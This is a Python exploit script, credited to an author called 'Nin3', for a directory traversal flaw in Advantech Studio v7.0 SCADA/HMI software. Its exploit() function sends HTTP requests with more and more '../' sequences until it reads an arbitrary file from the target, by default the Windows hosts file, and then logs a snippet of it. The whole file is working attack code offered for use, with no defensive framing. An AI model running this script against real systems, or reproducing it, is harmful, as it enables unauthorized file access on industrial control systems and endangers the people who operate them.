import requests
from utils.logger import setup_logger

logger = setup_logger()

def exploit(target: str, port: int = 80, file_path: str = "windows/system32/drivers/etc/hosts", max_depth: int = 32):
    """
    Exploit Title: Advantech Studio v7.0 SCADA/HMI Directory Traversal 0-day
    Author: Nin3
    Vendor: Advantech
    Version: 7.0 Build Number 0501.1111.0402.0000
    Exploit Type: Directory Traversal
    """

    base_url = f"http://{target}:{port}/"

    for depth in range(1, max_depth + 1):
        traversal = "../" * depth
        path = traversal + file_path
        url = base_url + path

        try:
            logger.info(f"[*] Trying: {url}")
            response = requests.get(url, timeout=5)

            if response.status_code == 200 and "localhost" in response.text.lower():
                logger.success(f"[+] File found via traversal depth={depth}")
                logger.info(f"[+] Snippet:\n{response.text[:500]}")
                return True
            elif response.status_code != 404:
                logger.warning(f"[?] Unexpected response (status {response.status_code}) at depth={depth}")

        except Exception as e:
            logger.error(f"[!] Error during request: {e}")
            break

    logger.warning("[-] Traversal failed â€” file not found within max depth.")
    return False
